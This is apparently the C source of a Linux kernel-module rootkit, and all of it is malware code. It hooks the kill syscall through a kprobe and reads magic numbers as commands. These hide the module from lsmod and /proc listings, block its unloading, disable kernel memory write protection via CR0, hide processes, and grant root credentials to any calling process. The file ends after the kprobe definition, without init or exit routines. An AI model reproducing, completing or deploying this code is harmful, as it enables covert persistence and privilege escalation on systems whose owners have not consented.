/*
 *	demonstrating that ~ Kernel is life
 */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/security.h>

#include <linux/list.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>


#define PF_INVISIBLE 0x10000000

#define HAXX 1337
#define PROT 2600
#define UNPR 2601
#define PROT_MEM 2602
#define UNPR_MEM 2603
#define HIDE_PRO 2604
#define GET_ROOT 2605

#define DEBUG 1

static struct list_head *prev_module_in_proc_modules_lsmod;
int is_hidden_proc = 0;
int is_hidden_sys = 0;
unsigned long cr0;


/* HIDE/SHOW ROOTKIT */
static void hide_rootkit(void)
{
	if (is_hidden_proc)
	{
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Revealing to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path\n");
        }
        #endif
        list_add(&THIS_MODULE->list, prev_module_in_proc_modules_lsmod);
        is_hidden_proc = 0;

	} else {
    	prev_module_in_proc_modules_lsmod = THIS_MODULE->list.prev;
    	#if DEBUG
    	{
    		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Hiding from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
    	}
    	#endif
    	list_del(&THIS_MODULE->list);
    	is_hidden_proc = 1;
    }

    return;
}

/* PROTECT ROOTKIT (FROM DELETING) */
static int is_protected = 0;
static void protect_rootkit(void)
{
	if (is_protected == 0)
	{
		try_module_get(THIS_MODULE);
		is_protected = 1;
		#if DEBUG
		{
			pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECTED\n");
		}
		#endif
	}
}

/* UNPROTECT ROOTKIT (FROM DELETING) */
static void unprotect_rootkit(void)
{
	if (is_protected == 1)
	{
		module_put(THIS_MODULE);
		is_protected = 0;
		#if DEBUG
		{
			pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ UNPROTECTED\n");
		}
		#endif
	}
}

/* FORCE CR0 */
static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

/* PROTECT MEMORY */
static inline void protect_memory(void)
{
	#if DEBUG
	{
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECT MEMORY\n");
	}
	#endif
	write_cr0_forced(cr0);
}

/* UNPROTECT MEMORY */
static inline void unprotect_memory(void)
{
	#if DEBUG
	{
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ UNPROTECT MEMORY\n");
	}
	#endif
	write_cr0_forced(cr0 & ~0x00010000);
}

/* FIND TASKS */
struct task_struct *find_task(pid_t pid)
{
	struct task_struct *target_process = current;

	for_each_process(target_process)
	{
		if (target_process->pid == pid)
		{
			return target_process;
		}
	}
	return NULL;
}

/* IS INVISIBLE */
static int is_invisible(pid_t pid)
{
	struct task_struct *task;

	if (!pid)
	{
		return 0;
	}

	task = find_task(pid);
	if (!task)
	{
		return 0;
	}
	if (task->flags & PF_INVISIBLE)
	{
		return 1;
	}
	return 0;
}

/* SET ROOT */
static void set_root(void)
{
	struct cred *root = prepare_creds();

	if (root == NULL)
	{
		return;
	}

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
}

/* HACKED HANDLER */
static int hacked_handler(struct kprobe *p, struct pt_regs *regs)
{
    unsigned long syscall_num = regs->orig_ax;
    struct task_struct *current_task = current;

    int rdi = (int) regs->di;
    int rsi = (int) regs->si;
    int rdx = (int) regs->dx;
    int pid = (int) current_task->pid;

    if (rsi == HAXX)
    {
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ CALLED pid: %d.\n", pid);
        }
	    #endif
    }
    else if (rsi == PROT)
    {
        protect_rootkit();
        hide_rootkit();
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Rootkit protection enabled!!!!\n");
        }
        #endif

    }
    else if (rsi == UNPR)
    {
        unprotect_rootkit();
        hide_rootkit();
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Rootkit protection disabled!!!!\n");
        }
        #endif

    }
    else if (rsi == PROT_MEM)
    {
        protect_memory();
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Memory protection enabled!!!!\n");
        }
        #endif

    }
    else if (rsi == UNPR_MEM)
    {
        unprotect_memory();
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Memory protection disabled!!!!\n");
        }
        #endif

    }
    else if (rsi == HIDE_PRO)
    {
		struct task_struct *task;

                if ((task = find_task(pid)) == NULL)
                        return -ESRCH;

                task->flags = task->flags ^ PF_INVISIBLE;
                #if DEBUG
                {
                    pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Hide/unhide process %d\n", pid);
                }
                #endif
		return 0;
    }
    else if (rsi == GET_ROOT)
    {
        set_root();
        #if DEBUG
        {
            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Offering you, root.\n");
        }
        #endif

    }

    return 0;
}

/* KPROBE */
static struct kprobe syscall_catch_kprobe = {
    .symbol_name = "__x64_sys_kill",
    .pre_handler = hacked_handler,
};

